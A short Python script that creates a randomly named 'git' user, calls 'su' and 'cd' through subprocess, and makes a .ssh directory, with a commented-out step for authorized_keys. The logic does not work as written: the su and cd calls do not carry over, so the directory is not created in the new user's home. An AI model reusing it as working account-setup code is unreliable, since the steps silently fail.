import os
import subprocess
import sys
import random


def add_user():
    my_username = 'git' + str(random.randint(0,100000))
    try:
        subprocess.run(['adduser', my_username])
        subprocess.run(['su', my_username])
        subprocess.run(['cd'])
        subprocess.run(['mkdir', '.ssh'])
        #subprocess.run(['touch', '.ssh/authorized_keys', '&&', 'chmod', '600', '.ssh/authorized_keys'])
    except:
        print('Failed to add user')


add_user()